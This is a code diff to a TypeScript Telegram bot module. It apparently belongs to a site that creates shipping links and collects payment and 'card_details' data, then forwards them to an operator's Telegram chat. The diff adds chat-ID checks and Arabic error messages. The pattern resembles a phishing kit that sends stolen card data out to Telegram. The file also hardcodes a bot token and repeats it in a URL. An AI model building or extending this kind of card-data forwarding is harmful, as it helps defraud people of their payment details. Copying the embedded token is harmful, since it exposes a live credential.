@@ -1,9 +1,21 @@
 // Telegram Bot Integration
 const BOT_TOKEN = '8208871147:AAGaRBd64i-1jneToDRe6XJ8hYXdBNnBLl0';
-// Note: This should be a USER chat ID, not the bot ID
-// To get your chat ID: Start conversation with @khlijapp_bot, then visit:
-// https://api.telegram.org/bot8208871147:AAGaRBd64i-1jneToDRe6XJ8hYXdBNnBLl0/getUpdates
+
+// IMPORTANT: This must be a USER chat ID, NOT the bot ID (8208871147)
+// To get your chat ID:
+// 1. Start conversation with @khlijapp_bot
+// 2. Send any message to the bot
+// 3. Visit: https://api.telegram.org/bot8208871147:AAGaRBd64i-1jneToDRe6XJ8hYXdBNnBLl0/getUpdates
+// 4. Look for "chat":{"id": in the response - that's your chat ID
+// 5. Or use the helper tool: open get-user-chat-id.html in your browser
 const CHAT_ID = 'YOUR_USER_CHAT_ID_HERE'; // Replace with your actual user chat ID
+
+// Check if CHAT_ID is properly configured
+if (CHAT_ID === 'YOUR_USER_CHAT_ID_HERE' || CHAT_ID === '8208871147') {
+  console.warn('⚠️ Telegram CHAT_ID not configured properly!');
+  console.warn('Please update CHAT_ID in /src/lib/telegram.ts with your actual user chat ID');
+  console.warn('Use get-user-chat-id.html helper tool to get your chat ID');
+}
 
 export interface TelegramMessage {
   type: 'shipping_link_created' | 'payment_recipient' | 'payment_confirmation' | 'card_details' | 'test';
@@ -19,6 +31,16 @@ export interface TelegramResponse {
 
 export const sendToTelegram = async (message: TelegramMessage): Promise<TelegramResponse> => {
   try {
+    // Check if CHAT_ID is properly configured
+    if (CHAT_ID === 'YOUR_USER_CHAT_ID_HERE' || CHAT_ID === '8208871147') {
+      const errorMsg = 'Telegram CHAT_ID not configured. Please update CHAT_ID in /src/lib/telegram.ts with your actual user chat ID. Use get-user-chat-id.html helper tool to get your chat ID.';
+      console.error('❌', errorMsg);
+      return {
+        success: false,
+        error: errorMsg
+      };
+    }
+
     const text = formatTelegramMessage(message);
     
     console.log('Sending to Telegram:', { chatId: CHAT_ID, message: text });
@@ -40,13 +62,29 @@ export const sendToTelegram = async (message: TelegramMessage): Promise<Telegram
     
     if (!response.ok) {
       console.error('Telegram API error:', responseData);
+      
+      // Provide specific error messages for common issues
+      let errorMessage = responseData.description || 'Unknown error';
+      
+      if (responseData.error_code === 403) {
+        if (responseData.description?.includes("bots can't send messages to bots")) {
+          errorMessage = 'خطأ: لا يمكن للبوت إرسال رسائل للبوت نفسه. يرجى تحديث CHAT_ID بمعرف المستخدم الصحيح. استخدم get-user-chat-id.html للحصول على معرف المحادثة الصحيح.';
+        } else if (responseData.description?.includes("Forbidden")) {
+          errorMessage = 'خطأ: محظور. تأكد من بدء محادثة مع البوت أولاً.';
+        }
+      } else if (responseData.error_code === 400) {
+        if (responseData.description?.includes("chat not found")) {
+          errorMessage = 'خطأ: لم يتم العثور على المحادثة. تأكد من صحة معرف المحادثة.';
+        }
+      }
+      
       return {
         success: false,
-        error: responseData.description || 'Unknown error'
+        error: errorMessage
       };
     }
 
-    console.log('Telegram response:', responseData);
+    console.log('✅ Telegram message sent successfully:', responseData);
     
     return {
       success: true,
